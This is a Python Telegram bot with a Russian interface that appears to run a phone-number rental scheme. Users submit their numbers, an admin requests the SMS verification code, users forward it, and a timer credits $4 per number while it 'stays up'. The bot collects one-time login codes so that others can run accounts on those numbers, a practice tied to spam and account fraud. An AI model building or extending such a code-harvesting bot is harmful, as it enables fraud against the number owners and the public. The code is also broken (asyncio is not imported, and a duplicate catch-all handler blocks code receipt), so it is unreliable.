import os
import time
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
PRICE = 4

bot = Bot(TOKEN)
dp = Dispatcher()

db = sqlite3.connect("bot.db")
cursor = db.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY,
    balance REAL DEFAULT 0
)
""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS logs(
    user_id INTEGER,
    number TEXT,
    seconds INTEGER,
    earn REAL,
    date TEXT
)
""")
db.commit()

numbers = {}
timers = {}
codes = {}

def seller_menu():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Сдать номер", callback_data="send")],
            [InlineKeyboardButton(text="📊 Отчет", callback_data="report")]
        ]
    )

def admin_number_menu(user):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔑 Запросить код", callback_data=f"code_{user}")],
            [InlineKeyboardButton(text="⏭ Скип", callback_data=f"skip_{user}")],
            [InlineKeyboardButton(text="🔄 Замена", callback_data=f"replace_{user}")]
        ]
    )

def after_code_menu(user):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ Встал", callback_data=f"start_{user}")]
        ]
    )

def timer_menu(user):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="❌ Слетел", callback_data=f"stop_{user}")],
            [InlineKeyboardButton(text="🔁 Повтор", callback_data=f"repeat_{user}")]
        ]
    )

@dp.message(Command("start"))
async def start(msg: types.Message):
    cursor.execute("INSERT OR IGNORE INTO users(id) VALUES(?)",(msg.from_user.id,))
    db.commit()
    await msg.answer("Меню:", reply_markup=seller_menu())

@dp.callback_query(F.data=="send")
async def ask_number(call:types.CallbackQuery):
    await call.message.answer("Отправьте номер +79999999999")

@dp.message()
async def receive_number(msg:types.Message):
    if msg.from_user.id==ADMIN_ID:
        return
    user = msg.from_user.id
    number = msg.text
    numbers[user] = number
    await bot.send_message(
        ADMIN_ID,
        f"📱 Новый номер\n{number}\nUser:{user}",
        reply_markup=admin_number_menu(user)
    )
    await msg.answer("Номер отправлен")

@dp.callback_query(F.data.startswith("code_"))
async def request_code(call:types.CallbackQuery):
    user=int(call.data.split("_")[1])
    await bot.send_message(user,"📩 У вас запросили код. Отправьте его сюда.")

@dp.message()
async def receive_code(msg:types.Message):
    if msg.from_user.id==ADMIN_ID:
        return
    user=msg.from_user.id
    code=msg.text
    codes[user]=code
    await bot.send_message(ADMIN_ID, f"🔑 Код от {user}: {code}", reply_markup=after_code_menu(user))

@dp.callback_query(F.data.startswith("start_"))
async def start_timer(call:types.CallbackQuery):
    user=int(call.data.split("_")[1])
    timers[user] = time.time()
    await bot.send_message(user,"✅ Номер встал. Таймер пошел")
    await call.message.answer("⏱ Таймер запущен", reply_markup=timer_menu(user))

@dp.callback_query(F.data.startswith("stop_"))
async def stop_timer(call:types.CallbackQuery):
    user=int(call.data.split("_")[1])
    start = timers.get(user)
    if not start:
        return
    total=int(time.time()-start)
    earn=PRICE
    cursor.execute("UPDATE users SET balance=balance+? WHERE id=?", (earn,user))
    cursor.execute("INSERT INTO logs VALUES(?,?,?,?,date('now'))", (user,numbers.get(user),total,earn))
    db.commit()
    await bot.send_message(user, f"⏹ Номер завершен\n⏱ {total} сек\n💰 {earn}$")
    await call.message.answer("Номер закрыт")

@dp.callback_query(F.data.startswith("repeat_"))
async def repeat_code(call:types.CallbackQuery):
    user=int(call.data.split("_")[1])
    await bot.send_message(user,"🔁 Отправьте новый код")

@dp.callback_query(F.data=="report")
async def report(call:types.CallbackQuery):
    user=call.from_user.id
    balance=cursor.execute("SELECT balance FROM users WHERE id=?",(user,)).fetchone()[0]
    await call.message.answer(f"📊 Отчет\n💰 Баланс: {balance}$")

@dp.message(Command("daily"))
async def daily(msg:types.Message):
    if msg.from_user.id!=ADMIN_ID:
        return
    rows=cursor.execute("SELECT user_id,number,earn FROM logs WHERE date=date('now')").fetchall()
    text="📊 Отчет за день\n"
    for r in rows:
        text+=f"user:{r[0]} | {r[1]} | {r[2]}$\n"
    await msg.answer(text)

@dp.message(Command("payouts"))
async def payouts(msg:types.Message):
    if msg.from_user.id!=ADMIN_ID:
        return
    rows=cursor.execute("SELECT id,balance FROM users WHERE balance>0").fetchall()
    text="💰 Выплаты:\n"
    total=0
    for r in rows:
        text+=f"user:{r[0]} → {r[1]}$\n"
        total+=r[1]
    text+=f"\nВсего: {total}$"
    await msg.answer(text)

@dp.message(Command("pay"))
async def pay(msg:types.Message):
    if msg.from_user.id!=ADMIN_ID:
        return
    rows=cursor.execute("SELECT id,balance FROM users WHERE balance>0").fetchall()
    for r in rows:
        check="ВСТАВЬ_ССЫЛКУ_ЧЕКА"
        await bot.send_message(r[0], f"💰 {r[1]}$\n{check}")
        cursor.execute("UPDATE users SET balance=0 WHERE id=?", (r[0],))
    db.commit()
    await msg.answer("Выплаты отправлены")

async def main():
    await dp.start_polling(bot)

if __name__=="__main__":
    asyncio.run(main())
